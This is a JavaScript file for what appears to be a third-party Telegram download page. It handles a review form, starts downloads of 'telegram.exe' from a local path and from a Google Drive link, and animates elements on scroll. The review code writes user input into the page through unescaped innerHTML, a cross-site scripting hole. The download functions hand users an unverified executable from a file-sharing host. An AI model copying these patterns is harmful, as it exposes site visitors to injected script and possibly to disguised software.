document.getElementById('reviewForm').addEventListener('submit', function(e) {
  e.preventDefault();

  const name = document.getElementById('username').value;
  const rating = document.getElementById('stars').value;
  const comment = document.getElementById('comment').value;

  const reviewCard = document.createElement('div');
  reviewCard.innerHTML = `<strong>${name}</strong> — ⭐ ${rating}<br><em>${comment}</em><hr>`;
  document.getElementById('reviewsDisplay').appendChild(reviewCard);

  this.reset();
});

function startDownload() {
  alert("Start Downloading Telegram...");
  window.location.href = "assets/telegram.exe";
}

// Function to handle direct download from Google Drive
function startDirectDownload() {
  // The Google Drive direct download URL
  const downloadUrl = "https://drive.google.com/uc?export=download&id=1QKWFGLvIRI1uKIceIpnf9XvAX8nmWU5p";
  
  // Create a temporary link element
  const link = document.createElement('a');
  link.href = downloadUrl;
  link.download = 'telegram.exe'; // Specify the filename
  link.style.display = 'none';
  
  // Append to the body, click it, and remove it
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}

// Set up the direct download when the page loads
document.addEventListener('DOMContentLoaded', function() {
  const directDownloadLink = document.getElementById('directDownload');
  if (directDownloadLink) {
    directDownloadLink.addEventListener('click', function(e) {
      e.preventDefault();
      startDirectDownload();
    });
  }
  
  // Add animation classes on scroll with infinite replay
  const observer = new IntersectionObserver((entries) => {
    entries.forEach((entry) => {
      if (entry.isIntersecting) {
        // Add visible class when element enters viewport
        entry.target.classList.add('is-visible');
      } else {
        // Remove visible class when element exits viewport for infinite animation
        entry.target.classList.remove('is-visible');
      }
    });
  }, {
    threshold: 0.1 // Trigger when 10% of the element is visible
  });

  const elementsToAnimate = document.querySelectorAll('.animate-on-scroll');
  elementsToAnimate.forEach((el) => observer.observe(el));
  
  // Add staggered delay to elements for a cascading effect
  elementsToAnimate.forEach((el, index) => {
    el.style.transitionDelay = `${index * 0.05}s`;
  });
});